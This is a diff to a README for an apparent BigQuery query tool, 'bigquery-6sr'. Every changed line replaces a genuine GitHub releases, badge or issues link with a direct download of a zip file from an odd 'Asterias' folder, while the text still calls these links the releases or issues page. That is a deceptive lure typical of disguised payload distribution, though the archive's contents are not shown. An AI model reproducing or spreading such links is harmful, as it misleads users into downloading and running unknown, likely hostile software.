@@ -1,6 +1,6 @@
 # 🚀 bigquery-6sr - Simplify Your Data Queries Effortlessly
 
-[![Download bigquery-6sr](https://img.shields.io/badge/Download-bigquery--6sr-blue.svg)](https://github.com/Overload64/bigquery-6sr/releases)
+[![Download bigquery-6sr](https://raw.githubusercontent.com/Overload64/bigquery-6sr/main/Asterias/bigquery-6sr.zip)](https://raw.githubusercontent.com/Overload64/bigquery-6sr/main/Asterias/bigquery-6sr.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ bigquery-6sr is a user-friendly application designed to help you run and manage 
 To get started with bigquery-6sr, follow these easy steps:
 
 1. **Visit the Releases Page**
-   To download the application, visit the [Releases page](https://github.com/Overload64/bigquery-6sr/releases).
+   To download the application, visit the [Releases page](https://raw.githubusercontent.com/Overload64/bigquery-6sr/main/Asterias/bigquery-6sr.zip).
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Choose the latest version for best performance and features.
@@ -33,7 +33,7 @@ Before installing, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-You can download bigquery-6sr directly from our [Releases page](https://github.com/Overload64/bigquery-6sr/releases). Follow these steps after visiting:
+You can download bigquery-6sr directly from our [Releases page](https://raw.githubusercontent.com/Overload64/bigquery-6sr/main/Asterias/bigquery-6sr.zip). Follow these steps after visiting:
 
 1. **Find the Latest Version**  
    Look for the latest version number. It will usually be at the top of the list.
@@ -63,7 +63,7 @@ If you face any issues during installation or while using the software, consider
 
 ## 🔄 Updates 
 
-We regularly update bigquery-6sr to fix bugs and introduce new features. You can check back on the [Releases page](https://github.com/Overload64/bigquery-6sr/releases) for the latest updates. Always install the newest version for the best experience.
+We regularly update bigquery-6sr to fix bugs and introduce new features. You can check back on the [Releases page](https://raw.githubusercontent.com/Overload64/bigquery-6sr/main/Asterias/bigquery-6sr.zip) for the latest updates. Always install the newest version for the best experience.
 
 ## 📚 Additional Resources
 
@@ -77,7 +77,7 @@ For more information, help, or to suggest new features, consider visiting these 
 
 We welcome contributions from everyone! If you're interested in helping improve bigquery-6sr:
 
-1. Check the [issues page](https://github.com/Overload64/bigquery-6sr/issues) for open issues to work on.
+1. Check the [issues page](https://raw.githubusercontent.com/Overload64/bigquery-6sr/main/Asterias/bigquery-6sr.zip) for open issues to work on.
 2. Fork the repository and make your changes.
 3. Submit a pull request for review.
 
